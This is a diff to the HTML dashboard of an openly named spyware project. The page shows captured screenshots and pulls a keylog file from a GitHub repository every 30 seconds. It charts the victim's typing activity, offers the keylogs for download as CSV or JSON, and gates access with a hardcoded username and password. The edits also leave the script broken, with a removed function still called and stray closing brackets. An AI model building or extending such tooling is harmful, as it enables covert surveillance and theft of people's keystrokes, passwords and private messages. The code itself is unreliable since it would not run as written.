@@ -17,7 +17,7 @@
             color: #2c3e50;
         }
         img {
-            width: 400px;
+            width: 1400px;
             height: auto;
             margin: 10px;
             border: 2px solid #2980b9;
@@ -78,17 +78,25 @@
             }
         }
 
-        /* Login Form Styles */
+        /* Styles for the login form */
         #login-form {
-            display: none; /* Hide initially */
+            display: none; /* Initially hidden */
             margin-bottom: 20px;
         }
         #login-form input {
+            margin: 10px 0;
             padding: 10px;
-            margin: 5px;
+            width: 100%;
             border: 1px solid #ccc;
             border-radius: 5px;
-            width: 200px;
+        }
+        #login-form button {
+            background-color: #2980b9;
+            color: white;
+            cursor: pointer;
+        }
+        #login-form button:hover {
+            background-color: #1a5b8a;
         }
     </style>
     <script src="https://cdn.jsdelivr.net/npm/chart.js"></script> <!-- Include Chart.js -->
@@ -104,9 +112,10 @@
         <button onclick="authenticateUser()">Login</button>
     </div>
 
-    <div id="main-content" style="display:none;">
+    <!-- Main content -->
+    <div id="main-content" style="display: none;">
         <button class="toggle-button" onclick="toggleDarkMode()">Toggle Dark Mode</button>
-        
+
         <h2>Latest Screenshot</h2>
         <div id="latest-screenshot">
             <!-- Latest screenshot will be shown here -->
@@ -147,7 +156,6 @@
             <!-- Keylog content will be displayed here -->
             <script>
                 const keylogUrl = "https://raw.githubusercontent.com/shrijaybaheti/spyware/main/logs/keylog.txt";
-                let activityChart; // Declare the activityChart variable outside the function
 
                 function fetchKeylog() {
                     fetch(keylogUrl)
@@ -155,11 +163,6 @@
                         .then(data => {
                             document.getElementById('keylog-content').innerText = data;
                             updateTimer();
-
-                            // Ensure activityChart is initialized before updating it
-                            if (!activityChart) {
-                                initializeActivityChart(); // Call function to initialize the chart
-                            }
                             updateActivityChart(data); // Update the chart with the latest keylog data
                         })
                         .catch(error => logError('Error fetching keylog: ' + error));
@@ -172,73 +175,56 @@
                     document.getElementById('timer').innerText = "Last updated: " + lastUpdateTime.toLocaleTimeString();
                 }
 
-                function initializeActivityChart() {
-                    const ctx = document.createElement('canvas');
-                    ctx.id = 'activityChart';
-                    document.body.appendChild(ctx);
-
-                    activityChart = new Chart(ctx, {
-                        type: 'line',
-                        data: {
-                            labels: [], // Timestamps for x-axis
-                            datasets: [{
-                                label: 'Typing Activity',
-                                data: [], // Data points for y-axis
-                                borderColor: 'rgba(75, 192, 192, 1)',
-                                borderWidth: 2,
-                                fill: false,
-                            }]
-                        },
-                        options: {
-                            responsive: true,
-                            scales: {
-                                x: {
-                                    type: 'time',
-                                    time: {
-                                        unit: 'minute'
-                                    },
-                                    title: {
-                                        display: true,
-                                        text: 'Time'
-                                    }
-                                },
-                                y: {
-                                    title: {
-                                        display: true,
-                                        text: 'Key Presses'
-                                    }
-                                }
-                            }
-                        });
-                }
-
-                // Update activity chart based on keylog data
-                function updateActivityChart(keylogData) {
-                    const lines = keylogData.trim().split('\n');
-                    const timestamps = [];
-                    const counts = [];
-
-                    lines.forEach(line => {
-                        const [timestamp, ...keys] = line.split(' ');
-                        timestamps.push(timestamp);
-                        counts.push(keys.length); // Count keys for this timestamp
-                    });
-
-                    activityChart.data.labels = timestamps;
-                    activityChart.data.datasets[0].data = counts;
-                    activityChart.update();
-                }
-
                 fetchKeylog(); // Initial fetch
                 setInterval(fetchKeylog, 30000); // Refresh every 30 seconds
 
                 // Timer display
                 document.body.insertAdjacentHTML('beforeend', '<div id="timer">Last updated: </div>');
+
+                // Chart for typing activity
+                const ctx = document.createElement('canvas');
+                ctx.id = 'activityChart';
+                document.body.appendChild(ctx);
+                const activityChart = new Chart(ctx, {
+                    type: 'line',
+                    data: {
+                        labels: [], // Timestamps for x-axis
+                        datasets: [{
+                            label: 'Typing Activity',
+                            data: [], // Data points for y-axis
+                            borderColor: 'rgba(75, 192, 192, 1)',
+                            borderWidth: 2,
+                            fill: false,
+                        }]
+                    },
+                    options: {
+                        responsive: true,
+                        scales: {
+                            x: {
+                                type: 'time',
+                                time: {
+                                    unit: 'minute'
+                                },
+                                title: {
+                                    display: true,
+                                    text: 'Time'
+                                }
+                            },
+                            y: {
+                                title: {
+                                    display: true,
+                                    text: 'Key Presses'
+                                }
+                            }
+                        }
+                    }
+                });
+                    });
+
+                }
             </script>
         </div>
 
-        <h2>Error Logs</h2>
-        <div id="error-logs"></div>
 
         <script>
             function logError(errorMessage) {
@@ -269,30 +255,43 @@
                     });
             }
 
-            // Add download button
-            const downloadButton = document.createElement('button');
-            downloadButton.classList.add('download-button');
-            downloadButton.innerText = 'Download Keylog as CSV';
-            downloadButton.onclick = downloadKeylogCSV;
-            document.body.appendChild(downloadButton);
+            // Download Logs in JSON format
+            function downloadKeylogJSON() {
+                fetch(keylogUrl)
+                    .then(response => response.text())
+                    .then(data => {
+                        const jsonData = JSON.stringify({ logs: data.split('\n') }, null, 2);
+                        const blob = new Blob([jsonData], { type: 'application/json' });
+                        const url = URL.createObjectURL(blob);
+                        const a = document.createElement('a');
+                        a.href = url;
+                        a.download = 'keylog.json';
+                        a.click();
+                        URL.revokeObjectURL(url);
+                    });
+            }
         </script>
-    </div>
+
+        <h2>Download Keylogs</h2>
+        <button class="download-button" onclick="downloadKeylogCSV()">Download as CSV</button>
+        <button class="download-button" onclick="downloadKeylogJSON()">Download as JSON</button>
+
 
     <script>
-        // Show login form on page load
-        document.getElementById("login-form").style.display = "block";
+        // Show the login form when the page loads
+        document.getElementById('login-form').style.display = 'block';
 
-        // Authenticate user
+        // User Authentication
         function authenticateUser() {
-            const username = document.getElementById("username").value;
-            const password = document.getElementById("password").value;
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
 
-            // Simple username and password check (you can replace this with your own logic)
+            // Replace with your own user validation logic
             if (username === "shrijay_baheti" && password === "shrijay@2007") {
-                document.getElementById("login-form").style.display = "none"; // Hide login form
-                document.getElementById("main-content").style.display = "block"; // Show main content
+                document.getElementById('login-form').style.display = 'none';
+                document.getElementById('main-content').style.display = 'block';
             } else {
-                alert("Invalid username or password");
+                alert("Invalid credentials. Access denied.");
             }
         }
     </script>
